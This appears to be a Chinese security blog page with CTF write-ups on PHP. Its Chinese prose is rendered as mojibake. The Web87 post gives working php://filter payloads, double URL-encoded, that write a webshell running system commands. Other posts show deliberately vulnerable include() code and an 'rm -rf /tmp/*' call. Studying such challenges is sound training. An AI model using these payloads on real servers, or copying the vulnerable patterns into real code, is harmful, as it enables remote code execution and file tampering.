<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Traveler2000ğŸª</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="ç½‘ç»œå®‰å…¨èœé¸Ÿï¼Œå¤§ä½¬ä»¬è§ç¬‘äº†">
<meta property="og:type" content="website">
<meta property="og:title" content="Traveler2000ğŸª">
<meta property="og:url" content="http://traveler2000.github.io/index.html">
<meta property="og:site_name" content="Traveler2000ğŸª">
<meta property="og:description" content="ç½‘ç»œå®‰å…¨èœé¸Ÿï¼Œå¤§ä½¬ä»¬è§ç¬‘äº†">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Traveler2000">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Traveler2000ğŸª" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Traveler2000ğŸª</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS è®¢é˜…"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="æœç´¢"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="æœç´¢"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://traveler2000.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-GETä¸POSTæ•°ç»„ç›¸å…³çŸ¥è¯†" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" class="article-date">
  <time class="dt-published" datetime="2025-04-25T09:06:49.000Z" itemprop="datePublished">2025-04-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">æ‚é¡¹çŸ¥è¯†ç‚¹</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">$_GET ä¸ $_POST æ•°ç»„ç›¸å…³çŸ¥è¯†</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>åœ¨PHPä¸­ï¼Œ<code>$_GET</code> å’Œ <code>$_POST</code> æ˜¯ä¸¤ç§ç‹¬ç«‹çš„è¶…å…¨å±€æ•°ç»„ï¼Œå®ƒä»¬çš„å‚æ•°æ¥æºå’Œå¤„ç†é€»è¾‘æœ‰æœ¬è´¨åŒºåˆ«ï¼š</p>
<h2 id="GET-çš„åº•å±‚é€»è¾‘"><a href="#GET-çš„åº•å±‚é€»è¾‘" class="headerlink" title="$_GET çš„åº•å±‚é€»è¾‘"></a><code>$_GET</code> çš„åº•å±‚é€»è¾‘</h2><ul>
<li><strong>å‚æ•°æ¥æº</strong>ï¼š<strong>URLæŸ¥è¯¢å­—ç¬¦ä¸²</strong>ï¼ˆå¦‚ <code>?key1=value1&amp;key2=value2</code>ï¼‰ã€‚</li>
<li><strong>æ— å…³è¯·æ±‚æ–¹æ³•</strong>ï¼šæ— è®ºè¯·æ±‚æ˜¯ <code>GET</code>ã€<code>POST</code> è¿˜æ˜¯å…¶ä»–æ–¹æ³•ï¼Œåªè¦URLä¸­å­˜åœ¨æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ŒPHPéƒ½ä¼šè‡ªåŠ¨è§£æåˆ° <code>$_GET</code> æ•°ç»„ä¸­ã€‚</li>
</ul>
<h2 id="POST-çš„åº•å±‚é€»è¾‘"><a href="#POST-çš„åº•å±‚é€»è¾‘" class="headerlink" title="$_POST çš„åº•å±‚é€»è¾‘"></a><strong><code>$_POST</code> çš„åº•å±‚é€»è¾‘</strong></h2><ul>
<li><strong>å‚æ•°æ¥æº</strong>ï¼š<strong>è¯·æ±‚ä½“ï¼ˆBodyï¼‰</strong>ï¼Œä¸”ä»…å½“è¯·æ±‚å¤´çš„ <code>Content-Type</code> æ˜¯ <code>application/x-www-form-urlencoded</code> æˆ– <code>multipart/form-data</code> æ—¶ï¼ˆå¦‚è¡¨å•æäº¤ï¼‰ã€‚</li>
<li><strong>ä¾èµ–è¯·æ±‚æ–¹æ³•</strong>ï¼šåªæœ‰ä½¿ç”¨ <code>POST</code> æ–¹æ³•æ—¶ï¼ŒPHPæ‰ä¼šè‡ªåŠ¨è§£æè¯·æ±‚ä½“åˆ° <code>$_POST</code> æ•°ç»„ã€‚</li>
<li><strong>æ³¨æ„</strong>ï¼šå¦‚æœè¦åœ¨ Burp Suite ä¸­å°† GET è¯·æ±‚ä¿®æ”¹ä¸º POST è¯·æ±‚å¹¶ä¿®æ”¹è¯·æ±‚ä½“ï¼Œè¯·åœ¨ä¿®æ”¹å®Œè¯·æ±‚è¡Œçš„ <code>GET</code> ååœ¨å³ä¾§ Inspector å†…ä¿®æ”¹è¯·æ±‚ä½“ï¼Œå¦åˆ™ Burp Suite ä¸ä¼šè‡ªåŠ¨å‘è¯·æ±‚å¤´ä¸­æ·»åŠ  <code>Content-Type</code> å­—æ®µï¼Œå¯¼è‡´å‚æ•°æ— æ³•ä¼ ç»™ <code>$_POST</code> æ•°ç»„ã€‚</li>
</ul>
<p>ç”±æ­¤å¯å¾—ï¼šåªè¦ URL ä¸­å­˜åœ¨æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œéƒ½ä¼šè¢«è§£æåˆ° <code>$_GET</code> æ•°ç»„ï¼›ä½† <code>$_POST</code> æ•°ç»„è¦æ±‚æ›´ä¸¥ï¼Œæ¡ä»¶ä¸æ»¡è¶³æ—¶ä¼šæœ‰å‚æ•°æ— æ³•ä¼ åˆ° <code>$_POST</code> æ•°ç»„ä¸­çš„æƒ…å†µã€‚</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" data-id="cm9wms3l30001kcuh3jm8bbze" data-title="$_GET ä¸ $_POST æ•°ç»„ç›¸å…³çŸ¥è¯†" class="article-share-link"><span class="fa fa-share">åˆ†äº«</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">æ‚é¡¹çŸ¥è¯†ç‚¹</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-filterä¼ªåè®®ç»•è¿‡dieï¼ˆWeb87ï¼‰" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2025-04-25T06:02:10.000Z" itemprop="datePublished">2025-04-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">å‘½ä»¤æ‰§è¡Œä¸æ–‡ä»¶åŒ…å«</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/">filter ä¼ªåè®®ç»•è¿‡ dieï¼ˆWeb87ï¼‰</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>è¿™é“é¢˜ä¸èƒ½å†ç”¨æ¡ä»¶ç«äº‰äº†ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç®€å•è¯´è¯´é¢˜ç›®ï¼š</p>
<p>è¯¥é¢˜ä¼šå°† <code>$_GET</code> æ•°ç»„ä¸­çš„ <code>file</code> å‚æ•° URL è§£ç ï¼Œç„¶åä»¥è§£ç åçš„ <code>file</code> å‚æ•°ä½œä¸ºæ–‡ä»¶è·¯å¾„&#x2F;æ–‡ä»¶åï¼Œç”Ÿæˆä¸€ä¸ªå†…å®¹ç”±å­—ç¬¦ä¸² <code>&lt;?php die(&#39;å¤§ä½¬åˆ«ç§€äº†&#39;);?&gt;</code> ä¸ <code>$_POST</code> æ•°ç»„ä¸­çš„ <code>content</code> å‚æ•°çš„å€¼æ‹¼æ¥è€Œæˆçš„æ–‡ä»¶ã€‚</p>
<p><code>urldecode()</code>ï¼šURL è§£ç ã€‚</p>
<p><code>file_put_contents()</code>ï¼šä¸ºæ–‡ä»¶å†™å…¥å†…å®¹ï¼Œé»˜è®¤è¦†ç›–å†™ã€‚</p>
<p>ç”±äºä¼š URL è§£ç ï¼Œæ‰€ä»¥å‰é¢çš„ä¸€ä¸²è¿‡æ»¤éƒ½å¯ä»¥ç®€å•ç»•è¿‡ã€‚ä½†æœ‰ <code>die()</code> å‡½æ•°ï¼Œä¼šç«‹åˆ»åœæ­¢è„šæœ¬ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•é˜»ç¢è¯¥å‡½æ•°æ‰§è¡Œã€‚</p>
<h2 id="è§£æ³•ä¸€ï¼šBase64"><a href="#è§£æ³•ä¸€ï¼šBase64" class="headerlink" title="è§£æ³•ä¸€ï¼šBase64"></a>è§£æ³•ä¸€ï¼šBase64</h2><p>å¯ä»¥ç”¨ <code>php://filter</code> ä¼ªåè®®ï¼Œä½¿å†™å…¥æ–‡ä»¶æ—¶å†…å®¹ç»è¿‡ Base64 è§£ç ï¼ŒåŒæ—¶åœ¨ <code>content</code> å‚æ•°ä¸­ä¼ å…¥ Base64 ç¼–ç åçš„ Payload ä»¥è¾¾åˆ°ç»•è¿‡ <code>die()</code> å‡½æ•°ã€æ‰§è¡Œæ¶æ„ä»£ç çš„ç›®çš„ï¼ˆ åŸæœ¬æ­£å¸¸çš„ <code>die()</code> å‡½æ•°è¢«è§£ç ä¸ºä¹±ç ï¼‰ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p>ç”±äºæœ‰ <code>urldecode()</code> å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥å¯¹ Payload è¿›è¡Œ URL è½¬ç ä»¥ç»•è¿‡è¿‡æ»¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%70%68%70%3A%2F%2F%66%69%6C%74%65%72%2F%77%72%69%74%65%3D%63%6F%6E%76%65%72%74%2E%62%61%73%65%36%34%2D%64%65%63%6F%64%65%2F%72%65%73%6F%75%72%63%65%3D%73%68%65%6C%6C%2E%70%68%70</span><br></pre></td></tr></table></figure>

<p>æ­¤å¤„ç®€å•ç²—æš´å…¨éƒ¨è½¬ç ã€‚å¦å¤–ï¼Œ <code>file</code> å‚æ•°é€šè¿‡ URL ä¼ å‚åˆ°æœåŠ¡å™¨æ—¶ï¼Œä¼šè¢« URL è§£ç ï¼Œä¸ºäº†ä½¿ Payload ä¸è¦è¿‡æ—©æš´éœ²è¢«è¿‡æ»¤ï¼Œè¿›è¡Œç¬¬äºŒæ¬¡è½¬ç ï¼ˆä¾æ—§ç®€å•ç²—æš´ï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%37%33%25%36%38%25%36%35%25%36%43%25%36%43%25%32%45%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>

<p>å¦å¤–ï¼Œ <code>content</code> å‚æ•°ä¹Ÿè¦è½¬ç ä¸º Base64 ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac fl0g.php&#x27;) ?&gt; ï¼ˆè·³è¿‡å‰é¢çš„ ls ï¼Œç›´æ¥æ¼”ç¤ºæœ€åä¸€æ­¥äº†ï¼‰</span><br><span class="line">PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKSA/Pg==</span><br></pre></td></tr></table></figure>

<p>ç”¨ Burp Suite æŠ“åŒ…ï¼Œå°† <code>GET</code> æ”¹ä¸º <code>POST</code> ï¼Œä¿®æ”¹ URL å‚æ•°ï¼Œç„¶åä¿®æ”¹è¯·æ±‚ä½“ã€‚</p>
<p>ç”±äº Base64 çš„å¤„ç†ç‰¹æ€§ï¼ˆè¯¦æƒ…è¯·è‡ªè¡ŒæŸ¥æ‰¾ï¼‰ï¼Œ <code>content</code> è¦åŠ ä¸¤ä¸ªå­—ç¬¦ï¼ˆè¿™é‡Œç”¨ <code>aa</code> ï¼‰ä»¥ä¿è¯è½¬ç åæ¶æ„ä»£ç æ­£å¸¸ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=aaPD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKSA/Pg==</span><br></pre></td></tr></table></figure>

<p>æœ€åå‘åŒ…å¹¶è®¿é—® <code>/shell.php</code> å³å¯ã€‚</p>
<h2 id="è§£æ³•äºŒï¼šROT13"><a href="#è§£æ³•äºŒï¼šROT13" class="headerlink" title="è§£æ³•äºŒï¼šROT13"></a>è§£æ³•äºŒï¼šROT13</h2><p>ä¸ Base64 åŸç†ç›¸åŒï¼Œä¹Ÿæ˜¯å°†ç¼–ç å¤„ç†åçš„ Payload è¿›è¡Œè§£ç å†å†™å…¥æ–‡ä»¶ï¼ŒåŒæ—¶ä½¿ <code>die()</code> å‡½æ•°æ— æ•ˆåŒ–ã€‚</p>
<p>ROT13 ç”¨åŒä¸€å¥—ç®—æ³•æ—¢å¯ä»¥ç¼–ç åˆå¯ä»¥è§£ç ã€‚ä»¥ä¸‹ä¸º Payload ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.rot13/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p>äºŒæ¬¡ URL ç¼–ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>

<p> <code>content</code> å‚æ•°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac fl0g.php&#x27;) ?&gt;</span><br><span class="line">&lt;?cuc flfgrz(&#x27;gnp sy0t.cuc&#x27;) ?&gt;</span><br></pre></td></tr></table></figure>

<p>æŠ“åŒ…ä¸ä¿®æ”¹åŒä¸Šï¼Œä½†ä¸ç”¨åŠ ä»€ä¹ˆå­—ç¬¦ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=&lt;?cuc flfgrz(&#x27;gnp sy0t.cuc&#x27;) ?&gt;</span><br></pre></td></tr></table></figure>

<p>æœ€åå‘åŒ…å¹¶è®¿é—® <code>/shell.php</code> å³å¯ã€‚</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/" data-id="cm9wms3ld000ikcuhdrhj39l8" data-title="filter ä¼ªåè®®ç»•è¿‡ dieï¼ˆWeb87ï¼‰" class="article-share-link"><span class="fa fa-share">åˆ†äº«</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">å‘½ä»¤æ‰§è¡Œ</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-æ¡ä»¶ç«äº‰å˜ä½“é¢˜ç›®" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/" class="article-date">
  <time class="dt-published" datetime="2025-04-25T02:00:03.000Z" itemprop="datePublished">2025-04-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">å‘½ä»¤æ‰§è¡Œä¸æ–‡ä»¶åŒ…å«</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/">æ¡ä»¶ç«äº‰å˜ä½“é¢˜ç›®</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="é¢˜ç›®ä¸€"><a href="#é¢˜ç›®ä¸€" class="headerlink" title="é¢˜ç›®ä¸€"></a>é¢˜ç›®ä¸€</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p><code>session_unset()</code>ï¼š æ¸…ç©º <code>$_SESSION</code> æ•°ç»„ï¼ˆ Session æ–‡ä»¶&#x2F;æ•°æ®å­˜åœ¨ï¼‰ã€‚</p>
<p><code>session_destroy()</code> ï¼šåˆ é™¤ Session æ–‡ä»¶&#x2F;æ•°æ®ã€‚</p>
<p>ç„¶è€Œä¸Šé¢çš„å‡½æ•°ä¸å½±å“åˆ›å»ºæ–°çš„  Session æ–‡ä»¶ï¼Œä¸” <code>PHP_SESSION_UPLOAD_PROGRESS</code> æœºåˆ¶ä¸ä¾èµ–ä»£ç ä¸­çš„ <code>session_start()</code>ï¼Œè€Œæ˜¯ç”± PHP å†…æ ¸åœ¨æ£€æµ‹åˆ°ä¸Šä¼ è¿›åº¦è·Ÿè¸ªæ—¶è‡ªåŠ¨å¤„ç†ã€‚</p>
<p>ä¾æ—§æ˜¯åˆ©ç”¨ <code>PHP_SESSION_UPLOAD_PROGRESS</code> ç”Ÿæˆ Session æ–‡ä»¶ï¼Œåé¢å°±ç®€å•äº†ã€‚</p>
<h2 id="é¢˜ç›®äºŒ"><a href="#é¢˜ç›®äºŒ" class="headerlink" title="é¢˜ç›®äºŒ"></a>é¢˜ç›®äºŒ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp/*&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>system(&quot;rm -rf /tmp/*&quot;);</code> åˆ é™¤æ‰€æœ‰ Session æ–‡ä»¶ã€‚ä½†è„šæœ¬é‡Œç•™äº†åé—¨ï¼Œåªåˆ é™¤ Session æ–‡ä»¶æ²¡ç”¨ã€‚</p>
<h2 id="é¢˜ç›®ä¸‰"><a href="#é¢˜ç›®ä¸‰" class="headerlink" title="é¢˜ç›®ä¸‰"></a>é¢˜ç›®ä¸‰</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span 